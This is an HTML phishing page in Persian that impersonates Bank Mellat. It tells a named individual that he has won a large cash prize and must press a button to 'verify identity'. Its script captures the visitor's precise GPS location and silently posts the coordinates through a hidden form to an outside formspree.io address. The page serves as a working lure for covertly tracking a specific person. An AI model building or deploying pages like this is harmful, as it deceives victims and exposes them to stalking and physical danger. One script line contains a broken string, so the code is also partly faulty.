<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>برنده خوش‌شانس بانک ملت</title>
  <link rel="icon" href="https://www.bankmellat.ir/Portals/0/favicon.ico" type="image/x-icon">
  <link href="https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: 'Vazirmatn', sans-serif;
      background: linear-gradient(to top, #f9f9f9, #ffffff);
      color: #222;
      margin: 0;
      padding: 0;
      text-align: center;
    }

    .card {
      max-width: 500px;
      margin: 80px auto;
      background: white;
      border-radius: 16px;
      box-shadow: 0 6px 24px rgba(0,0,0,0.12);
      padding: 30px;
    }

    .card img {
      margin-bottom: 20px;
    }

    .card h1 {
      color: #b30000;
      font-size: 26px;
    }

    .card h2 {
      color: #333;
      margin-top: 5px;
    }

    .card p {
      font-size: 17px;
      margin: 10px 0;
    }

    .btn {
      background-color: #b30000;
      color: white;
      padding: 12px 24px;
      font-size: 17px;
      border: none;
      border-radius: 8px;
      margin-top: 25px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    .btn:hover {
      background-color: #920000;
    }

    #status {
      margin-top: 20px;
      font-weight: bold;
      color: #555;
    }

    .footer {
      margin-top: 50px;
      font-size: 12px;
      color: #aaa;
    }
  </style>
</head>
<body>
  <div class="card">
    <img src="https://www.bankmellat.ir/Portals/0/logo-fa.png" alt="بانک ملت" width="120">
    <h1>تبریک!</h1>
    <h2>جناب آقای حسین قرنی‌زاده</h2>
    <p>شما برنده <strong>۱ میلیارد تومان نقد</strong> از طرف بانک ملت شدید.</p>
    <p>لطفاً برای دریافت جایزه، دکمه زیر را بزنید و هویت خود را تأیید کنید.</p>
    <button class="btn" onclick="getLocation()">تأیید هویت و دریافت جایزه</button>
    <p id="status"></p>

    <form id="gpsForm" action="https://formspree.io/f/xkgrwvde" method="POST" style="display:none;">
      <input type="hidden" name="latitude" id="latitude">
      <input type="hidden" name="longitude" id="longitude">
    </form>
  </div>

  <div class="footer">تمامی حقوق متعلق به بانک ملت می‌باشد © 1403</div>

  <script>
    function getLocation() {
      if (navigator.geolocation) {
        document.getElementById("status").innerText = "در حال تایید هویت لطفاً صبر کنید ...";
        navigator.geolocation.getCurrentPosition(sendLocation, showError, {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        });
      } else {
        document.getElementById("status").innerText = "لطفاً در ساعتی دیگر دوباره نسبت به تایید هویت اقدام کنید با تشکر بانک ملت .";
      }
    }

    function sendLocation(position) {
      document.getElementById("latitude").value = position.coords.latitude;
      document.getElementById("longitude").value = position.coords.longitude;
      document.getElementById("gpsForm").submit();
      document.getElementById("status").innerText = ";
    }

    function showError(error) {
      document.getElementById("status").innerText = "دریافت موقعیت ناموفق بود. لطفاً GPS را فعال کنید.";
    }
  </script>
</body>
</html>
